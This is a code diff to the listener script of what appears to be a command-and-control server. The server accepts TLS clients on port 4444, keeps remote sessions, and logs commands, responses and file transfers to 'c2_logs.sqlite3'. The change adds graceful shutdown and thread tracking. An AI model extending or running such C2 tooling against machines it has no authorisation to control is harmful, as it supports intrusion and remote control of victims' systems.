@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
-import os,socket,threading,ssl
+import os, socket, threading, ssl, signal, sys
 
-# Import from utils
 from .utils import sessions, shell, db_logger, common
 
 def main():
@@ -9,7 +8,7 @@ def main():
     db_path = os.path.join(os.path.dirname(__file__), "data", "c2_logs.sqlite3")
     conn = db_logger.init_db(db_path)
     
-    # Create database hooks
+    # Create database hooks - UPDATED FOR CONTEXT PARAMETER
     db_hooks = {
         "register_client": lambda fp, data, ip, port: 
             db_logger.register_or_update_client(conn, fp, data, ip, port),
@@ -17,12 +16,12 @@ def main():
             db_logger.record_session_open(conn, cid, ip, port),
         "record_session_close": lambda cid: 
             db_logger.record_session_close(conn, cid),
-        "record_command": lambda cid, cmd: 
-            db_logger.record_command(conn, cid, cmd),
+        "record_command": lambda cid, cmd, context="interact":
+            db_logger.record_command(conn, cid, cmd, context),
         "record_response": lambda cid, data: 
             db_logger.record_response(conn, cid, data),
-        "record_transfer": lambda cid, d, n, s: 
-            db_logger.record_file_transfer(conn, cid, d, n, s),
+        "record_transfer": lambda cid, d, n, s, context="interact":
+            db_logger.record_file_transfer(conn, cid, d, n, s, context),
     }
     
     # Setup TLS
@@ -36,6 +35,9 @@ def main():
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(("0.0.0.0", 4444))
     server.listen(5)
+    
+    # Set socket timeout to handle shutdown gracefully
+    server.settimeout(1.0)
     
     # Use the box_runtime function from common
     common.box_runtime("[*] Server listening on 0.0.0.0:4444")
@@ -57,43 +59,90 @@ def main():
     # Legacy client counter (for clients without fingerprint)
     legacy_client_id = 0
     
+    # Threads list to keep track of client handlers
+    client_threads = []
+    
+    # Signal handler for Ctrl+C
+    def signal_handler(sig, frame):
+        print("\n[!] Received shutdown signal")
+        shutdown_event.set()
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    
     try:
         while not shutdown_event.is_set():
-            raw_sock, addr = server.accept()
-            print(f"[+] Connection from {addr[0]}:{addr[1]}")
-            
             try:
-                client_socket = context.wrap_socket(raw_sock, server_side=True)
-            except ssl.SSLError as e:
-                print(f"[!] TLS error from {addr}: {e}")
-                raw_sock.close()
+                raw_sock, addr = server.accept()
+                print(f"[+] Connection from {addr[0]}:{addr[1]}")
+                
+                try:
+                    client_socket = context.wrap_socket(raw_sock, server_side=True)
+                except ssl.SSLError as e:
+                    print(f"[!] TLS error from {addr}: {e}")
+                    raw_sock.close()
+                    continue
+                
+                # Increment legacy counter (will be overridden if client sends fingerprint)
+                legacy_client_id += 1
+                temp_cid = legacy_client_id
+                
+                # Add to sessions dict with temp ID
+                sessions.add_client(temp_cid, client_socket)
+                
+                # Start handler thread and keep track of it
+                client_thread = threading.Thread(
+                    target=sessions.handle_client,
+                    args=(client_socket, addr, temp_cid, db_hooks),
+                    daemon=True
+                )
+                client_thread.start()
+                client_threads.append(client_thread)
+                
+            except socket.timeout:
+                # Timeout for accept, check if we should shutdown
                 continue
-            
-            # Increment legacy counter (will be overridden if client sends fingerprint)
-            legacy_client_id += 1
-            temp_cid = legacy_client_id
-            
-            # Add to sessions dict with temp ID
-            sessions.add_client(temp_cid, client_socket)
-            
-            # Start handler thread
-            threading.Thread(
-                target=sessions.handle_client,
-                args=(client_socket, addr, temp_cid, db_hooks),
-                daemon=True
-            ).start()
-            
+            except OSError as e:
+                if shutdown_event.is_set():
+                    break
+                print(f"[!] Socket error: {e}")
+                break
+    
     except KeyboardInterrupt:
         print("\n[!] Shutting down")
+        shutdown_event.set()
     except OSError as e:
         if not shutdown_event.is_set():
             print(f"[!] Server error: {e}")
     finally:
+        print("[*] Shutting down server...")
         shutdown_event.set()
+        
+        # Close all client connections
         sessions.close_all_sessions()
-        server.close()
-        conn.close()
-        print("[*] Server closed")
+        
+        # Close server socket
+        try:
+            server.close()
+        except:
+            pass
+        
+        # Close database connection
+        try:
+            conn.close()
+        except:
+            pass
+        
+        # Wait a moment for threads to finish
+        print("[*] Waiting for threads to finish...")
+        for thread in client_threads:
+            try:
+                thread.join(timeout=1.0)
+            except:
+                pass
+        
+        print("[*] Server shutdown complete")
+        # Exit the program gracefully
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
